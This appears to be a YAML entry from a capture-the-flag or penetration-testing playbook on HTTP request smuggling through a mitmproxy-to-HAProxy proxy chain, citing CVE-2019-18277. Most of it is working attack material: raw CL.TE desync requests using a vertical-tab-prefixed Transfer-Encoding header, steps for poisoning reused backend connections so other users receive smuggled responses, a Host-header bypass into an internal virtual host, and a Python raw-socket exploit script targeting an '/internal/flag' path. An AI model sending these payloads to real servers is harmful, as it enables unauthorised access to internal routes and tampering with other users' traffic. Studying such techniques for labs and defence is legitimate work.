name: http_request_smuggling_proxy_chain
category: web
tags: [http_smuggling, haproxy, mitmproxy, desync, cve-2019-18277]
indicators:
  - "Proxy chain: mitmproxy -> haproxy -> backend"
  - "HAProxy with 'no option http-use-htx' and 'http-reuse always'"
  - "mitmproxy 6.0.2 or below"
  - "HAProxy 2.0.5 or below"
  - "Internal routes protected by Host header routing"
  - "Virtual hosts with different ServerName"

tricks:
  - name: "CVE-2019-18277: HAProxy Transfer-Encoding bypass"
    when: "HAProxy 2.0.5 or below with 'no option http-use-htx'"
    how: "Use \\x0b or \\x0c before 'chunked' to bypass TE detection"
    payload: |
      # HAProxy doesn't recognize Transfer-Encoding with \x0b prefix
      # HAProxy uses Content-Length, backend uses Transfer-Encoding
      # This causes CL.TE desync
      
      POST / HTTP/1.1
      Host: localhost
      Content-Length: 65
      Transfer-Encoding:\x0bchunked
      
      0
      
      GET /internal/path HTTP/1.1
      Host: internal.router
      
      

  - name: "mitmproxy HTTP Request Smuggling"
    when: "mitmproxy 6.0.2 or below"
    how: "Smuggle request in body using CL.TE desync"
    payload: |
      # mitmproxy uses Content-Length, backend uses Transfer-Encoding
      # Smuggled request is forwarded as part of the body
      
      POST / HTTP/1.1
      Host: localhost
      Content-Length: 65
      Transfer-Encoding: chunked
      
      0
      
      GET /internal/path HTTP/1.1
      Host: internal.router
      
      

  - name: "HAProxy http-reuse exploitation"
    when: "HAProxy configured with 'http-reuse always'"
    how: "Poison backend connection to affect subsequent requests"
    payload: |
      # HAProxy reuses backend connections
      # Smuggled request poisons the connection
      # Next request from another user gets smuggled response
      
      # Step 1: Send smuggling payload
      # Step 2: Smuggled request stays in backend buffer
      # Step 3: Next legitimate request triggers smuggled request

  - name: "Host-based virtual host routing bypass"
    when: "Backend has multiple virtual hosts based on Host header"
    how: "Smuggle request with different Host header to access internal vhost"
    payload: |
      # Apache config:
      # <VirtualHost *:80>
      #     Servername internal.router
      #     ...
      # </VirtualHost>
      
      # Smuggle request with Host: internal.router
      # to access internal virtual host

  - name: "Python exploit template"
    when: "Need to automate HTTP smuggling"
    how: "Use raw sockets to send malformed HTTP"
    payload: |
      import socket
      
      smuggled = "GET /internal/flag HTTP/1.1\r\nHost: internal.router\r\n\r\n"
      body = f"0\r\n\r\n{smuggled}"
      
      payload = (
          f"POST / HTTP/1.1\r\n"
          f"Host: localhost\r\n"
          f"Content-Length: {len(body)}\r\n"
          f"Transfer-Encoding:\x0bchunked\r\n"
          f"\r\n"
          f"{body}"
      )
      
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock.connect(("localhost", 80))
      sock.send(payload.encode())
      response = sock.recv(4096)
      print(response.decode())

